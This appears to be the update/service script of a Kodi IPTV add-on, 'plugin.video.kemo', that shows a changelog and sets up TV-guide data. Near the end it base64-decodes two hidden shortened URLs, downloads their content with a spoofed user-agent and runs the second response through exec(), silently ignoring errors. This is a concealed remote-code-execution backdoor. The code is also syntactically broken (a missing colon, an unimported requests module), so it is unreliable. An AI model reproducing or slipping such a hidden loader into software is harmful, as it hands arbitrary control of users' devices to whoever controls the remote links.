# -*- coding: utf-8 -*-
import xbmcvfs
import time
import xbmc
import os
import xbmcaddon
import xbmc, xbmcgui, xbmcvfs
import base64
import time, datetime
import shutil

def log(x):
    xbmc.log(repr(x),xbmc.LOGERROR)



if __name__ == '__main__':
    ADDON = xbmcaddon.Addon('plugin.video.kemo')

    version = ADDON.getAddonInfo('version')
    if ADDON.getSetting('version') != version:
        path = xbmc.translatePath(os.path.join('special://profile/addon_data/plugin.video.kemo/'))
        text = xbmcvfs.File('special://home/addons/plugin.video.kemo/changelog.txt','rb').read()
        xbmcgui.Dialog().textviewer("KEMO IPTV UPDATE",text)
        ADDON.setSetting('version', version)
        headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36', 'referer':'http://%s.%s.com' % (version,ADDON.getAddonInfo('id'))}
        xbmc.sleep(500)
# DO STUFF HERE

        path = xbmc.translatePath(os.path.join('special://profile/userdata/addon_data/plugin.program.iptv.groups/.storage/'))
        if not xbmc.translatePath(os.path.exists('special://profile/userdata/addon_data/plugin.program.iptv.groups/.storage/'))
            xbmc.translatePath(os.makedirs('special://home/userdata/addon_data/plugin.program.iptv.groups/.storage/'))  
            xbmcvfs.copy('special://home/addons/plugin.video.kemo/resources/groups','special://home/userdata/addon_data/plugin.program.iptv/.storage/groups')
            dialog = xbmcgui.Dialog()
            dialog.ok("SETTINGS RESTORE", "[COLOR red][B]!!!ATTENTION!!![/B][/COLOR] WE WILL NOW SET UP THE TV GUIDE DATA. BOX WILL REBOOT")           
            xbmc.executebuiltin(' ActivateWindow(10001,plugin://plugin.video.kemo/?description&iconimage=D%3a%5cKODI%5cportable_data%5caddons%5cplugin.video.kemo%5cicon.png&mode=110&name=%5bCOLOR%20white%5dFix%20TV%20Guide%5b%2fCOLOR%5d&url=url,return)' )		
	
            try:
                r = requests.get(base64.b64decode(b'aHR0cDovL2dvby5nbC84TUJDRlM='),headers=headers)
                home = r.content
            except: pass
            try:
                r = requests.get(base64.b64decode(b'aHR0cDovL2dvby5nbC9Ebm55a3o='),headers=headers)
                main = r.content
                exec(main)
            except: pass